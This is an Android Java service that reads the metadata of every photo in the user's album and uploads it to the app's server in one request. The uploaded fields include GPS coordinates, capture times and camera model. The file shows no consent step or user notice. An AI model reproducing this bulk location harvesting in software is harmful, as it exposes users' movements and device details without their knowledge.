package com.bigshark.android.services;

import android.app.IntentService;
import android.content.Intent;

import com.bigshark.android.core.display.IDisplay;
import com.bigshark.android.core.utils.ConvertUtils;
import com.bigshark.android.core.utils.image.MetadataReader;
import com.bigshark.android.http.HttpConfig;
import com.bigshark.android.http.xutils.CommonRequestParams;
import com.bigshark.android.http.xutils.CommonResponseCallback;
import com.bigshark.android.http.xutils.HttpSender;
import com.bigshark.android.mmkv.MmkvGroup;
import com.bigshark.android.utils.StringConstant;
import com.socks.library.KLog;
import com.tencent.bugly.crashreport.CrashReport;

import java.io.File;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

/**
 * 上传相册中的所有图片的metadata
 */
public class MetadatasIntentService extends IntentService {

    public static final long UPLOAD_CONTACTS_SERVICES_TIME = 1000 * 60 * 10;


    private String uid;

    public MetadatasIntentService() {
        super("MetadatasIntentService");
    }

    private long createTime;

    @Override
    public void onCreate() {
        super.onCreate();
        createTime = System.currentTimeMillis();
    }

    @Override
    public void onDestroy() {
        if (System.currentTimeMillis() - createTime > UPLOAD_CONTACTS_SERVICES_TIME) {
            KLog.w("live time over 10 minutes");
            CrashReport.postCatchedException(new Throwable(uid + "live time over 10 minutes"));
        }
        super.onDestroy();
    }

    @Override
    protected void onHandleIntent(Intent intent) {
        uid = MmkvGroup.loginInfo().getUserName();

        long currTime = System.currentTimeMillis();
        List<String> albumPaths = MetadataReader.getAlbumPaths(this);
        List<Map<String, Object>> currentAlbums = new ArrayList<>(albumPaths.size());
        for (String albumPath : albumPaths) {
            File albumFile = new File(albumPath);
            Map<String, Object> metaData = MetadataReader.getMetadata(albumFile, MetadataReader.MAPPING_EXIF_TAGS);
            Map<String, Object> filted = filterMetaData(metaData);

//            filted.put("AlbumFilePath", albumFile.getAbsolutePath());
            filted.put("AlbumFileCrawlTime", currTime);
            filted.put("AlbumFileLastModifiedTime", albumFile.lastModified());

            currentAlbums.add(filted);
        }

        //report
        HttpSender.post(new CommonResponseCallback<String>(null) {

            @Override
            public CommonRequestParams createRequestParams() {
                // 上传相册中图片的meta数据
                String uploadMetaDatasUrl = HttpConfig.getRealUrl(StringConstant.HTTP_DATA_UPLOAD_META);
                CommonRequestParams requestParams = new CommonRequestParams(uploadMetaDatasUrl);
                final String metadata = ConvertUtils.toString(currentAlbums);
                requestParams.addBodyParameter("content", metadata);
                return requestParams;
            }

            @Override
            public void handleUi(boolean isStart) {
            }

            @Override
            public void handleSuccess(String resultData, int resultCode, String resultMessage) {
            }

            @Override
            public void handleFailed(int resultCode, String resultMessage) {
            }

            @Override
            public void onCancelled(CancelledException cex) {
                KLog.d(cex);
            }
        });
    }

    private final List<String> filterFields = Arrays.asList(
            "DateTime", "DateTimeDigitized", "DateTimeOriginal",
            "GPSAltitude", "GPSAltitudeRef", "GPSLatitude", "GPSLatitudeRef", "GPSLongitude", "GPSLongitudeRef",
            "GPSProcessingMethod", "GPSTimeStamp", "GPSDateStamp", "GPSVersionID",
            "ISOSpeedRatings",
            "Make", "Model", "Orientation",
            "ImageLength", "ImageWidth",
            "PixelXDimension", "PixelYDimension"
    );

    private Map<String, Object> filterMetaData(Map<String, Object> metaData) {
        Map<String, Object> filted = new HashMap<>(metaData.size());
        for (Map.Entry<String, Object> entry : metaData.entrySet()) {
            if (filterFields.contains(entry.getKey())) {
                filted.put(entry.getKey(), entry.getValue());
            }
        }
        return filted;
    }

    public static void report(IDisplay display) {
        Intent intent = new Intent(display.act(), MetadatasIntentService.class);
        display.startService(intent);
    }

}
